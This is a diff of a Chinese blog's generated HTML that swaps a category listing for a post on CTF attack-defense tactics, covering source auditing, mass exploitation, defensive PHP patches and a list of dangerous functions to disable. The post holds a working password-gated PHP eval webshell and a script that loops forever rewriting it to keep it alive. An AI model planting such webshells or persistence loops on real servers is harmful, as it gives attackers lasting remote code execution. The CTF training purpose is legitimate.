@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="液氮腾,CTF,Writeup,UP">
+  <meta name="keywords" content="ctf,web攻防,">
 
 
 
@@ -79,13 +79,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="液氮腾">
-<meta property="og:url" content="http://yoursite.com/categories/实验吧Writeup/page/2/index.html">
+<meta name="description" content="第三阶段开场先把源码拖到本地备份   源码审计部分立即开始源码审计，快速查找敏感词，例如$_REQUEST $_GET $_POST upload exec找sql语句部分，是否为字符串拼接查找敏感功能模块，比如上传，命令执行可以只看源码找，也可以配合看网站内容模块，找对应的代码部分   漏洞利用部分 找出漏洞点后快速编写脚本进行批量攻击夺取flag   另外一个人编写脚本，利用该漏洞植入其他木马">
+<meta name="keywords" content="ctf,web攻防">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web攻防思路">
+<meta property="og:url" content="http://yoursite.com/2018/12/23/web攻防思路/index.html">
 <meta property="og:site_name" content="液氮腾">
+<meta property="og:description" content="第三阶段开场先把源码拖到本地备份   源码审计部分立即开始源码审计，快速查找敏感词，例如$_REQUEST $_GET $_POST upload exec找sql语句部分，是否为字符串拼接查找敏感功能模块，比如上传，命令执行可以只看源码找，也可以配合看网站内容模块，找对应的代码部分   漏洞利用部分 找出漏洞点后快速编写脚本进行批量攻击夺取flag   另外一个人编写脚本，利用该漏洞植入其他木马">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-12-23T15:36:16.160Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="液氮腾">
+<meta name="twitter:title" content="web攻防思路">
+<meta name="twitter:description" content="第三阶段开场先把源码拖到本地备份   源码审计部分立即开始源码审计，快速查找敏感词，例如$_REQUEST $_GET $_POST upload exec找sql语句部分，是否为字符串拼接查找敏感功能模块，比如上传，命令执行可以只看源码找，也可以配合看网站内容模块，找对应的代码部分   漏洞利用部分 找出漏洞点后快速编写脚本进行批量攻击夺取flag   另外一个人编写脚本，利用该漏洞植入其他木马">
 
 
 
@@ -115,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/categories/实验吧Writeup/page/2/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/23/web攻防思路/">
 
 
 
 
 
-  <title>分类: 实验吧Writeup | 液氮腾</title>
+  <title>web攻防思路 | 液氮腾</title>
   
 
 
@@ -141,7 +146,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -267,291 +272,285 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block category">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>实验吧Writeup<small>分类</small>
-        </h1>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/23/web攻防思路/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="液氮腾">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://s.gravatar.com/avatar/9d0016d5cce4d742ce7f8ee4b471354e?s=240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="液氮腾">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/11/10/catalyst-system/" itemprop="url">
-              
-                <span itemprop="name">catalyst-system</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">web攻防思路</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T12:26:33+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-23T23:35:55+08:00">
+                2018-12-23
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/实验吧Writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">实验吧Writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/CFG-to-C/" itemprop="url">
-              
-                <span itemprop="name">CFG to C</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T12:23:35+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/Byte-Code/" itemprop="url">
-              
-                <span itemprop="name">Byte Code</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T12:21:08+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/bitwise/" itemprop="url">
-              
-                <span itemprop="name">bitwise</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T12:19:20+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
-
-    </header>
-  </article>
+        <h1 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h1><p>开场先把源码拖到本地备份  </p>
+<h2 id="源码审计部分"><a href="#源码审计部分" class="headerlink" title="源码审计部分"></a>源码审计部分</h2><p>立即开始源码审计，快速查找敏感词，例如<code>$_REQUEST</code> <code>$_GET</code> <code>$_POST</code> <code>upload</code> <code>exec</code><br>找sql语句部分，是否为字符串拼接<br>查找敏感功能模块，比如上传，命令执行<br>可以只看源码找，也可以配合看网站内容模块，找对应的代码部分  </p>
+<h2 id="漏洞利用部分"><a href="#漏洞利用部分" class="headerlink" title="漏洞利用部分"></a>漏洞利用部分</h2><ul>
+<li>找出漏洞点后快速编写脚本进行批量攻击夺取flag  </li>
+<li>另外一个人编写脚本，利用该漏洞植入其他木马、webshell，避免该漏洞后续被修复后无法再次利用  </li>
+<li>大家都是用脚本批量传shell，所以可能存在蹭/被蹭shell的情况。<br>webshell内容最好不要直接写<code>eval($_POST[&#39;cmd&#39;]);</code>可以多加个if判断，比如判断是否有传a参数，并且<code>md5(a)==&#39;xxxxxxx&#39;</code>  </li>
+<li>为避免webshell失活【被删】，可以在webshell里加上死循环，无限写马，注意修改超时时间为0【即无限】，最大消耗内存，该值根据比赛环境决定，直接设为物理内存的上限<ul>
+<li>php是被动式的，为保证无限写马能运行，需要先访问一次。  </li>
+</ul>
+</li>
+<li>还有一个队员实时盯着log，如果有出现丢分，迅速查看log，看对方的进攻点，给另外两个队员提供修复方案和进攻思路，如果我方无法找到漏洞点，也可以直接使用其他人的进攻方式</li>
+</ul>
+<p>webshell</p>
+<pre><code class="php">&lt;?php
+// 永不超时
+ini_set(&#39;max_execution_time&#39;,0);
+// 设置最大使用内存值4G
+ini_set(&#39;memory_limit&#39;,&#39;4096M&#39;);
+// md5(&#39;test&#39;) === &#39;098f6bcd4621d373cade4e832627b4f6&#39;
+// 这里if的条件你们可以看着改，目的就是为了别人蹭你们的webshell
+if (md5($_POST[&#39;password&#39;]) === &#39;098f6bcd4621d373cade4e832627b4f6&#39;) {
+    @eval($_POST[&#39;cmd&#39;]);
+}
+?&gt;
+</code></pre>
+<p>无限生成webshell</p>
+<pre><code class="php">&lt;?php
+// 永不超时
+ini_set(&#39;max_execution_time&#39;,0);
+// 设置最大使用内存值4G
+ini_set(&#39;memory_limit&#39;,&#39;4096M&#39;);
+$data = 
+&#39;
+&lt;?php
+// 永不超时
+ini_set(&quot;max_execution_time&quot;,0);
+// 设置最大使用内存值4G
+ini_set(&quot;memory_limit&quot;,&quot;4096M&quot;);
+// md5(&quot;test&quot;) === &quot;098f6bcd4621d373cade4e832627b4f6&quot;
+if (md5($_POST[&quot;password&quot;]) === &quot;098f6bcd4621d373cade4e832627b4f6&quot;) {
+    @eval($_POST[&quot;cmd&quot;]);
+};
+&#39;;
 
 
-      
-        
+while (true) {
+    file_put_contents(&#39;shell.php&#39;, $data);
+}
+?&gt;
+</code></pre>
+<h2 id="防御部分"><a href="#防御部分" class="headerlink" title="防御部分"></a>防御部分</h2><p>比赛健康检查机制越来越严，就别想着关服务，改文件权限这些”歪门邪道”<br>如果是apache，注意.htaccess的内容，是否有敏感信息，比如将xx后缀的也作为php进行解析，url_rewrite<br>注意web目录下，可能是根目录，或者其他地方，是否存在web源码的压缩包，提示文本，robots之类的，有的话可以删<br>如果有权限重启服务，修改php.ini中的disable_functions值，禁止如下敏感函数  </p>
+<pre><code>passthru()
+exec()
+shell_exec()
+system()
+shell_exec()
+proc_open()
+popen()
+proc_get_status()
+assert()
+以上函数均可执行任意命令
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+scandir()
+chgrp()
+chown()
+chmod()
+以上4个可以配合修改文件权限，避免别人过来搞事情，比如木马持续化利用，【自己能以root身份登靶机就忽略吧】
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/easycreakme/" itemprop="url">
-              
-                <span itemprop="name">easycreakme</span>
-              
-            </a>
-        
-      </h2>
+error_log()
+可以写文件到任意位置，作为一种骚姿势写马，甚至是二进制数据，配合chmod()添加执行权限，示例
+error_log(&quot;You messed up!&quot;, 3, &quot;/var/tmp/my-errors.log&quot;);
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T12:16:08+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
+putenv()
+getenv()
+在一些做了字符串过滤的地方，可以利用这两个函数从环境变量中取值拼接出shell code
 
-    </header>
-  </article>
+dl()
+pfsockopen()
+stream_socket_server()
+调用外部进程，建立socket通讯
 
+readlink()
+symlink()
+这两个配合可以绕过上传的黑名单限制，传符号链接文件进行读取flag
 
-      
-        
+ini_restore()
+syslog()
+禁用这2个，避免环境被搞乱，防搅屎
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/逆向观察/" itemprop="url">
-              
-                <span itemprop="name">逆向观察</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T12:11:47+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/1000/" itemprop="url">
-              
-                <span itemprop="name">1000</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T12:08:55+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/100w/" itemprop="url">
-              
-                <span itemprop="name">100w</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T11:59:39+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/迷路/" itemprop="url">
-              
-                <span itemprop="name">迷路</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T11:53:39+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/10/加密算法/" itemprop="url">
-              
-                <span itemprop="name">加密算法</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-10T11:47:40+08:00" content="2018-11-10">
-          11-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+</code></pre><h3 id="自己实现简易log"><a href="#自己实现简易log" class="headerlink" title="自己实现简易log"></a>自己实现简易log</h3><pre><code class="php">&lt;?php
+// 自定义log
+// apache或nginx的log默认只记录get记录，post记录需要安装对应模块，所以自己实现
+// 这段直接放入口文件就好
+// 日志文件放/tmp/weblog下没有这目录自己建
+// 为避免频繁打开写入关闭同一个文件造成卡顿，每一次访问都存在单独的文件里，查看直接cat /tmp/weblog/*
+$data = [
+    &#39;uri&#39; =&gt; $_SERVER[&#39;REQUEST_URI&#39;],
+    &#39;method&#39; =&gt; $_SERVER[&#39;REQUEST_METHOD&#39;],
+    &#39;data&#39; =&gt; file_get_contents(&#39;php://input&#39;)
+];
+ob_start();
+var_dump($data);
+$output = ob_get_clean();
+file_put_contents(&#39;/tmp/weblog/&#39;.date(&quot;Y-m-d-Hisu&quot;).&#39;-&#39;.time().&#39;.log&#39;, $output);
+?&gt;
+</code></pre>
+<h3 id="根据源码审计和日志出获取的消息修改对应模块的语句"><a href="#根据源码审计和日志出获取的消息修改对应模块的语句" class="headerlink" title="根据源码审计和日志出获取的消息修改对应模块的语句"></a>根据源码审计和日志出获取的消息修改对应模块的语句</h3><ul>
+<li>针对sql注入防御，比赛时间有限，没时间让你重写为pdo，随便加点过滤，或者直接禁止执行sql语句  </li>
+<li>文件上传部分，给它传，直接修改文件上传目录到其他位置，脱离web目录就好，比如<code>/tmp</code>，或者修改上传文件目录的权限，<code>可写</code> <code>不可读</code> <code>不可执行</code>  </li>
+<li>如果还有文件包含漏洞，添加<code>set_include_path(&#39;/var/www/html/xxxx&#39;);</code>语句，禁止跨出web目录，或者做白名单限制，只能读取哪些文件  </li>
+<li>ssrf部分，简单粗暴一点，参数内容如果有  <code>://</code>  直接exit出去，协议部分用代码写死拼接  </li>
+<li>xxe部分，添加<code>libxml_disable_entity_loader(true);</code>语句，禁止解析外部实体，完事</li>
+<li>反序列化部分，反序列化的内容禁止由用户控制，或者直接注释反序列化语句好了</li>
+<li>命令执行部分，如果改了php.ini，禁止了那些函数，略过，如果因为各种原因无法改，过滤<code>管道符</code> <code>分隔符</code> <code>百分号</code>，如果用正则去匹配，用<code>preg_match_all()</code>函数进行匹配<br><code>preg_match()</code>存在换行绕过问题</li>
+</ul>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web攻防/" rel="tag"># web攻防</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/10/whatamitoyou/" rel="next" title="whatamitoyou">
+                <i class="fa fa-chevron-left"></i> whatamitoyou
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/categories/实验吧Writeup/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/categories/实验吧Writeup/">1</a><span class="page-number current">2</span><a class="page-number" href="/categories/实验吧Writeup/page/3/">3</a><a class="page-number" href="/categories/实验吧Writeup/page/4/">4</a><a class="extend next" rel="next" href="/categories/实验吧Writeup/page/3/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -559,6 +558,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -579,8 +582,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -642,6 +654,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第三阶段"><span class="nav-number">1.</span> <span class="nav-text">第三阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源码审计部分"><span class="nav-number">1.1.</span> <span class="nav-text">源码审计部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用部分"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御部分"><span class="nav-number">1.3.</span> <span class="nav-text">防御部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#自己实现简易log"><span class="nav-number">1.3.1.</span> <span class="nav-text">自己实现简易log</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#根据源码审计和日志出获取的消息修改对应模块的语句"><span class="nav-number">1.3.2.</span> <span class="nav-text">根据源码审计和日志出获取的消息修改对应模块的语句</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -782,6 +810,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
